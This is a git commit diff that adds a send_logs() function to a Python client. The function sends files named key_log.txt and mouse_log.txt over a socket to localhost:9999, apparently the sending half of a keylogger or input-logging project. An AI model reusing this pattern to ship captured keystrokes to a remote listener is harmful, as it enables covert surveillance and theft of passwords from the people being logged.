07ab53da51f62e6617eaab411304c396ecae1fa0
Adisakshya Chauhan <45028982+adisakshya@users.noreply.github.com>
2019-03-09 13:19:36 +0530

    added function send_logs

--- bin/client.py
+++ bin/client.py
@@ -1,12 +1,15 @@
 import socket
 import sys
 
-def send(filename):
+files = ['key_log.txt', 'mouse_log.txt']
+
+def send_logs():
 	s = socket.socket()
 	s.connect(("localhost",9999))
-	f = open (filename, "rb")
-	l = f.read(1024)
-	while (l):
-	    s.send(l)
-	    l = f.read(1024)
+
+	for filename in files:
+		f = open (filename, "rb")
+		l = f.read(1024)
+		s.send(l)
+
 	s.close()
